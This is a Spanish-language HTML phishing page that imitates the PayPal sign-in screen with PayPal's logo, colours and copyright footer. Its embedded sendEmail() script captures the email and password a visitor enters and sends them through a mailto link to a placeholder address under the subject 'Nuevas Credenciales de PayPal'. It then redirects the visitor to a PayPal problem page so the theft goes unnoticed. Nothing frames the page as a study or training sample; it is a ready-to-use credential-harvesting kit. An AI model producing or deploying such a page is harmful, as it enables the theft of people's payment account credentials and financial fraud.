<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Inicio de Sesión</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
        .container { width: 350px; margin: 50px auto; padding: 20px; background-color: #fff; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 150px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .form-group input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        .submit-btn { width: 100%; padding: 10px; background-color: #0070ba; color: white; border: none; border-radius: 4px; font-size: 16px; }
        .submit-btn:hover { background-color: #005bb5; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.paypalobjects.com/webstatic/mktg/Logo/PP_Logo_Horiz_RGB.png" alt="PayPal Logo">
        </div>
        <form id="loginForm" action="https://www.paypal.com/signin" method="post" onsubmit="sendEmail()">
            <div class="form-group">
                <label for="email">Correo Electrónico:</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <input type="submit" value="Iniciar Sesión" class="submit-btn">
        </form>
        <div class="footer">
            <p>© 2026 PayPal. Todos los derechos reservados.</p>
        </div>
    </div>

    <script>
        function sendEmail() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var subject = "Nuevas Credenciales de PayPal";
            var body = "Correo Electrónico: " + email + "\nContraseña: " + password;
            window.location.href = "mailto:tu_correo@example.com?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
            setTimeout(function() {
                window.location.href = "https://www.paypal.com/signin/problem";
            }, 1000);
        }
    </script>
</body>
</html>
